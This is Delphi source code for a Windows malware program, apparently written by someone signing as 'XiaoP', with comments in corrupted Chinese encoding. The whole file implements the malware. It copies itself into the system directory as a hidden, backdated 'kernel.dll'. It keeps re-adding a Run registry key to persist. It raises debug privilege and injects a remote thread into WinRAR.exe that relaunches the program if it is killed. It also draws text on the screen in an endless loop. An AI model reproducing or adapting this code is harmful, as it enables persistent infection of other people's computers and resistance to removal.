unit Main_Pas;

interface

uses
  windows ,SysUtils,psapi;

type
  remoteparameter=^Tremoteparameter;

  Tremoteparameter=record     //����Զ�̲߳����ṹ
    rpopenprocess:dword;
    rpwaitforsingleobject:dword;
    rpfindfirstfile:dword;
    rpcopyfile:dword;
    rpfindclose:dword;
    rpwinexec:dword;

    rpprocess_remote_Thread:THANDLE;
    rpprocess_hand:THANDLE;
    rpfilehandle:THANDLE;

    rbackupname:array[0..255]of char;
    rpwinexecname:array[0..255]of char;

    rpfdata:WIN32_FIND_DATA;
  end;

const
  MAX_PATH=255;
  procedure MainThread();

  function search_file(path:string):boolean; //�����ļ��Ƿ����

  procedure copy_file(E_file,Sub_file:string); //�����ļ�����

  procedure create_file(); //�򿪱����ļ����޸�����

  procedure watch_reg_Thread(); //�����߳�

  procedure remote_Thread(parm:pointer);//winapi; //Զ�߳�

  function Enum_Processes(sub_Processes:string):DWORD;

  procedure Create_remote(remote_pocess_name:string);   //����Զ�̹߳���

  {�������ؽ���Ȩ�޺���}
  function EnabledDebugPrivilege(const bEnabled: Boolean): Boolean;

  procedure display();

implementation
var
  Sysfilename: string;    //ϵͳĿ¼�µı�����
  backupfile: string;
  rp: Tremoteparameter;
  RemoteThread_PID: DWORD; //Զ�߳�PID
  RemoteThread_hand:Thandle;

procedure MainThread();
var
  syspath:array[0..MAX_PATH] of char;
  E_if:boolean;
  Thread_hand:Thandle;
  ThreadID:Dword;
begin
   GetSystemDirectory(syspath,MAX_PATH);   //�õ�ϵͳĿ¼
   backupfile:=strpas(syspath)+'\'+'kernel.dll'; //�����ļ�
   create_file();
   copy_file(ParamStr(0),backupfile);
   E_if:=search_file(strpas(syspath));
   if E_if then
      begin
                        //�Ѵ��ڴ��ļ��Ͳ���Ҫ������
      end
   else
      begin
        {�����ļ���ָ��Ŀ¼}
       copy_file(ParamStr(0),Sysfilename);
     end;
    {���������̼߳��ע����Զ�߳�}
    Create_remote('WinRAR.exe');
    sleep(10);       //������Ҫ ��֤�ȴ���Զ�߳�
    Thread_hand:=CreateThread(nil,0,@watch_reg_Thread,nil,0,ThreadID); //���������߳�
    display();

end;


function search_file(path:string):boolean;
var
  lpFindFileData: TWIN32FindData;
  ExeName:string;
  str:string;
  Hand:Thandle;
begin
  str:=ParamStr(0);     //��ó��������·������
  while pos('\',str)<>0 do    //ѭ��--ȡ��Ӧ�ó�������
  begin
    str:=copy(str,pos('\',str)+1,length(ParamStr(0)));
  end;
  ExeName:=str;
  {���ݷ���ֵ�ж��ļ��Ƿ����}
  Sysfilename:=path+'\'+ExeName;
  Hand:=FindFirstFile(pchar(path+'\'+ExeName),lpFindFileData);
  if hand<>INVALID_HANDLE_VALUE   then
  begin
    result:=true;
    // showmessage('OK');
  end
  else
    result:=false;
    //FindClose(Hand);
end;

procedure copy_file(E_file,Sub_file:string);
begin
    CopyFile(pchar(E_file),pchar(Sub_file),TRUE);      //�����ļ�
end;

  {�ΰ�����κ���д��1����Сʱ�Ÿ㶨 ��ֱ��---ʱ���ʽת��}
procedure create_file();
var
   hand:Thandle;
   Creat_time:TFiletime;    //�ļ�����ʱ���ʽ����
   Last_write_time:TFiletime;
   DosDateTime:Dword;
   date:TDatetime;   //����ʱ���ͱ���
begin
    date:=strtodate('2006-3-16'); //�ַ�ת��ΪTDatetime��ʽ
    DosDateTime:= DateTimeToFileDate(date); //��TDatetimeתΪDOSʱ���ʽ--DWORD����
    {��DOSʱ���ʽת��Ϊ�ļ�����ʱ���ʽ}
    DosDateTimeToFileTime(LongRec(DosDateTime).Hi,LongRec(DosDateTime).Lo,Creat_time);
    {�򿪱����ļ�}
    hand:=CreateFile(pchar

(backupfile),GENERIC_WRITE,FILE_SHARE_WRITE,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
    {�����ļ�ʱ��}
    SetFileTime(hand,@Creat_time,nil,@Creat_time);
    {�����ļ�����-ֻ����ϵͳ������}
    SetFileAttributes(pchar(backupfile),FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_HIDDEN or

FILE_ATTRIBUTE_SYSTEM );
end;

procedure watch_reg_Thread();
var
   rgspath:string;
   ret:integer;
   mkey:Hkey;
   event_hand:Thandle;
   exitcode:Dword;
begin
     {����һ����Զ���ᷢ�����¼�}
     event_hand:=CreateEvent(nil,false,false,'Xiaop');
    while true do
     begin
     rgspath:='Software\Microsoft\Windows\CurrentVersion\Run';
     {�Բ�ѯ�ķ�ʽ��ע���}
     ret:=RegOpenKeyEx(HKEY_LOCAL_MACHINE,pchar(rgspath),0,KEY_QUERY_VALUE,mkey);
     //if ret<>ERROR_SUCCESS then break;
     {��ѯ�Ƿ������Ӧ�ĵļ�ֵ   }

     ret:=RegQueryValueEx(mkey,'rav',nil,nil,nil,nil); //���д�Ĳ���^_^
     RegCloseKey(mkey);
     if ret<>ERROR_SUCCESS then
      begin
          RegOpenKeyEx(HKEY_LOCAL_MACHINE,pchar(rgspath),0,KEY_WRITE,mkey);
          RegSetValueEx(mkey,'rav',0,REG_SZ,pchar(Sysfilename),255);
          RegCloseKey(mkey);
      end;
     GetExitCodeThread(RemoteThread_hand,exitcode);   //�õ�Զ�߳�״̬
     if exitcode<>STILL_ACTIVE then                 //���Զ�̱߳�����
        Create_remote('love.exe');                            //���´���Զ�߳�
      {�ȴ���ʱ��Ӧ---��ʵ�ּ��}
     WaitforsingleObject(event_hand,2000);
    end;
end;

procedure remote_Thread(parm:pointer);//winapi;   //Զ�̺߳���
type
  TEOpenProcess = function (a:DWORD;b:longbool;c: DWORD): THANDLE; //WINAPI;
  TEFindFirstFile= function(name:LPCTSTR;data:WIN32_FIND_DATA):THandle;//WINAPI;
  TEWaitForSingleObject=function(Handle:Thandle;Milliseconds:dword):DWORD;//WINAPI;
  TEFindClose=function(hFindFile:Thandle):boolean;//WINAPI;
  TEWinExec=function(CmdLine:pchar;CmdShow:integer):integer;//WINAPI;
  TECopyFile=function(ExistingFileName:pchar;NewFileName:pchar):boolean; //WINAPI;
var
  erp:remoteparameter;
  EOpenProcess:TEOpenProcess;
  EWaitForSingleObject:TEWaitForSingleObject;
  EFindFirstFile:TEFindFirstFile;
  EFindClose:TEFindClose;
  EWinExec:TEWinExec;
  ECopyFile:TECopyFile;
begin
  erp:=remoteparameter(parm);
  EOpenProcess:=TEOpenProcess(erp.rpopenprocess);
  EWaitForSingleObject:=TEWaitForSingleObject(erp.rpwaitforsingleobject);
  EFindFirstFile:=TEFindFirstFile(erp.rpfindfirstfile);
  EWinExec:=TEWinExec(erp.rpwinexec);
  ECopyFile:=TECopyFile(erp.rpcopyfile);
  EFindClose:=TEFindClose(erp.rpfindclose);

  erp.rpprocess_remote_Thread:=EOpenProcess(PROCESS_ALL_ACCESS,FALSE,erp.rpprocess_hand);
  EWaitForSingleObject(erp.rpprocess_remote_Thread,INFINITE);
  erp.rpfilehandle:=EFindFirstFile(erp.rpwinexecname,erp.rpfdata);
  if erp.rpfilehandle=INVALID_HANDLE_VALUE then
  ECopyFile(erp.rbackupname,erp.rpwinexecname);
  EFindClose(erp.rpfilehandle);
  EWinExec(erp.rpwinexecname,0);
end;
     {ö�����н���--����ָ�����̵�PID}
function Enum_Processes(sub_Processes:string):DWord;
var
  szProcessName:array [0..MAX_PATH] of char;
  aProcesses:array [0..1024] of DWORD;
  cbNeeded, cProcesses:DWORD;
  i:integer;
  hand:THandle;
  hMod:HMODULE;
  cmNeeded:DWORD;
begin
  EnumProcesses( @aProcesses, sizeof(aProcesses), cbNeeded );
  cProcesses:=cbNeeded div sizeof(DWORD);
  for i:=1 to cProcesses do
  begin
    hand:=OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ,FALSE,aProcesses[i]);
    if hand<>0 then
    begin
      if EnumProcessModules( hand, @hMod, sizeof(hMod),cmNeeded) then
        GetModuleBaseName(hand,hMod,@szProcessName,sizeof(szProcessName));
      if AnsiCompareStr(sub_Processes,szProcessName)=0 then
      begin
        result:=aProcesses[i];
        break;
      end;
    end;
  end;
end;

procedure   Create_remote(remote_pocess_name:string);
var
  Remote_PID:dWORD;
  hand:Thandle;
  cb:DWord;
  RemoteThread:pointer;
  pRemoteThread:pointer;
  moudel_hand:Thandle;
  s_cb:DWord;
  ReturnCode: Boolean;
  process_hand:Thandle;
  ThreadID:Dword;
begin
  Remote_PID:=Enum_Processes(pchar(remote_pocess_name));
  {�������ؽ���Ϊ��ʽ��}
  EnabledDebugPrivilege(true);
  hand:=OpenProcess(PROCESS_CREATE_THREAD + PROCESS_VM_OPERATION +
PROCESS_VM_WRITE,FALSE,Remote_PID);
if hand<>0 then
   begin
     rp.rpprocess_hand:= GetCurrentProcessId();
     moudel_hand:=GetModuleHandle('Kernel32');
     rp.rpopenprocess:=dword(GetProcAddress(moudel_hand,'OpenProcess'));
     rp.rpwaitforsingleobject:=Dword(GetProcAddress(moudel_hand,'WaitForSingleObject'));
     rp.rpfindfirstfile:=Dword(GetProcAddress(moudel_hand,'FindFirstFileW'));
     rp.rpcopyfile:=Dword(GetProcAddress(moudel_hand,'CopyFileW'));
     rp.rpfindclose:=Dword(GetProcAddress(moudel_hand,'FindClose'));
     rp.rpwinexec:=Dword(GetProcAddress(moudel_hand,'WinExec'));
     strlcopy(@rp.rbackupname,Pchar(backupfile),length(backupfile));
     strlcopy(@rp.rpwinexecname,Pchar(Sysfilename),length(Sysfilename));
     {�������ڶ�̬��ȡAPI������ַ}


     cb:=4*sizeof(rp);
     pRemoteThread:=PWIDESTRING(VirtualAllocEx(hand,nil,cb,MEM_COMMIT,PAGE_EXECUTE_READWRITE));
     {if RemoteThread=nil then showmessage('Զ���̿ռ�����ʧ��--����')
            else showmessage('Զ���̿ռ�����ɹ�--����'); }
     ReturnCode:=WriteProcessMemory(hand, pRemoteThread,pointer(@rp),cb,s_cb);
     {if ReturnCode then   showmessage('��Զ����д�����ݳɹ�--����')
           else   showmessage('��Զ����д������ʧ��--����');}

     cb:=2*10*1024;
     RemoteThread:=PWIDESTRING((VirtualAllocEx(hand,nil,cb,MEM_COMMIT,PAGE_EXECUTE_READWRITE)));
       {if RemoteThread=nil then showmessage('Զ���̿ռ�����ʧ��')
            else showmessage('Զ���̿ռ�����ɹ�'); }

     ReturnCode:=WriteProcessMemory(hand,RemoteThread,pointer(@remote_Thread),cb,s_cb);
       {if ReturnCode then   showmessage('��Զ����д�����ݳɹ�')
           else   showmessage('��Զ����д������ʧ��'); }

     // CreateThread(nil,0, @remote_Thread,nil,0,ThreadID);//�����ı����߳�
     RemoteThread_hand:=CreateRemoteThread(hand,nil,0,TFNThreadStartRoutine(RemoteThread),pRemoteThread,0 , RemoteThread_PID);
      {if   RemoteThread_PID<> 0 then
        begin
         showmessage('����Զ�̳߳ɹ�');

        end
     else showmessage('����Զ�߳�ʧ��'); }

    CloseHandle(hand);
  end;
end;


function EnabledDebugPrivilege(const bEnabled: Boolean): Boolean;
var
  hToken: THandle;
  tp: TOKEN_PRIVILEGES;
  a: DWORD;
const
  SE_DEBUG_NAME = 'SeDebugPrivilege';
begin
  Result := False;
  {�򿪽����������÷��ʽ���Ȩ��}
  if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, hToken)) then
  begin
    tp.PrivilegeCount := 1;
    LookupPrivilegeValue(nil, SE_DEBUG_NAME, tp.Privileges[0].Luid);//�õ���Ȩ����
    if bEnabled then
      { //����Ȩ���ͷ��䵽���̱�ʶ
      }
    tp.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED
    else
      {����Ĭ��Ȩ������}
      tp.Privileges[0].Attributes := 0;
    a := 0;
     {��Ҫ�е���������ȨTOKEN_ADJUST_PRIVILEGES}
    AdjustTokenPrivileges(hToken, False, tp, SizeOf(tp), nil, a);
    Result := GetLastError = ERROR_SUCCESS;
    CloseHandle(hToken);
   end;
end;

procedure display();
var
  hScreenDC: hdc;
  MyOutput1: PChar;
  MyOutput2: PChar;
  MyOutput3: PChar;
  MyOutput4: PChar;
  MyOutput5: PChar;
  event_hand:Thandle;
begin
  hScreenDC := GetDC(0);
  event_hand:=CreateEvent(nil,false,false,'PTZZ');
  MyOutput1:='�� �� �� �� �� �� ��';
  MyOutput2:='�� ҹ �� �� �� ҹ �L';
  MyOutput3:='�b �� �� �� �p �p �w';
  MyOutput4:='�� Ȼ �� �� �� �� ��';
  MyOutput5:= 'By--XiaoP';
  while True do
  begin
    TextOut(hScreenDC, 450, 250, MyOutPut1, lstrlen(MyOutPut1));
    TextOut(hScreenDC, 450, 300, MyOutPut2, lstrlen(MyOutPut2));
    TextOut(hScreenDC, 450, 350, MyOutPut3, lstrlen(MyOutPut3));
    TextOut(hScreenDC, 450, 400, MyOutPut4, lstrlen(MyOutPut4));
    TextOut(hScreenDC, 450, 450, MyOutPut5, lstrlen(MyOutPut5));
    WaitforsingleObject(event_hand,2000);
  end;
  ReleaseDC(0, hScreenDC);
end;

end.

